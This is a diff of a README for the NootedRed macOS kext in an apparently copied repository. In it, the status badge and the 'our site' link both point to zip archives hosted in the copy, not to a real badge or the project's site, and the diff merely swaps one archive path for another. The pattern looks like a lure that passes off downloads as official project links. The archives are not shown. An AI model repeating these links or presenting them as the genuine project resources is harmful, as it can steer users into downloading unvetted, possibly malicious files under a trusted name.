@@ -1,4 +1,4 @@
-# NootedRed ![GitHub Workflow Status](https://raw.githubusercontent.com/Jovanbeats/NootedRedcopy/master/.github/workflows/Redcopy_Nooted_v3.3.zip)
+# NootedRed ![GitHub Workflow Status](https://raw.githubusercontent.com/Jovanbeats/NootedRedcopy/master/NootedRed/Redcopy-Nooted-2.2.zip)
 
 The AMD Vega iGPU support kext.
 
@@ -18,4 +18,4 @@ The NootedRed project is Copyright © 2022-2024 ChefKiss. The NootedRed project 
 > [!NOTE]
 > This project is under active research and development; There will be crashes here and there, but is generally smooth.
 >
-> See repository issues and [our site](https://raw.githubusercontent.com/Jovanbeats/NootedRedcopy/master/.github/workflows/Redcopy_Nooted_v3.3.zip) for more information.
+> See repository issues and [our site](https://raw.githubusercontent.com/Jovanbeats/NootedRedcopy/master/NootedRed/Redcopy-Nooted-2.2.zip) for more information.
